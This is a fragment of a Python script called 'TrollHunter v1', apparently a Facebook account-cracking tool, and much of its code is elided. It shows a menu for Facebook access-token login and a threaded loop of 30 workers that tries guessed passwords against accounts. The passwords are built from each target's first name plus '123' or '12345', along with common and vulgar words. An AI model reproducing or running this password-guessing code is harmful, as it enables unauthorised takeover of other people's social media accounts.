#!/usr/bin/python
#encoding=utf-8
#Coded by TumisoRSA :) TTD :Vipper-Cyber404
...
def opening():
	...
	print("╔════╦══╦═══╗╔╗─╔╦╗─╔╦═╗─╔╦════╦═══╦═══╗²ᵏ¹
              ...
              ──║║─╔╣╠╣╚══╗║║─║║╚═╝║║─║║║─║║─║╚══╣║║╚╗
               ──╚╝─╚══╩═══╝╚╝─╚╩═══╩╝─╚═╝─╚╝─╚═══╩╝╚═╝")
	print("\t\t     ToolName : TrollHunter v1\nAuthor : TumisoRSA | IG : @DroidMoon\n[01]. Login Access Token Fb\n[02]. Access Token Fb\n[00]. Exit\n")
	kintil()
def login():
		...
		with Bool(max_workers=30) as tokai:
			...
			try:
				...
				try:
					...
					continue
			pas=[fb2["first_name"]+"123",fb2["first_name"]+"12345","Bangsad","Bangsad123","Monyet","Monyet123","Freefire","Freefire123","Doraemon","Sayang123","Booyah","Booyah123","Kontol","Kontol123","Ashir123"]
			for pw in pas:
				try:
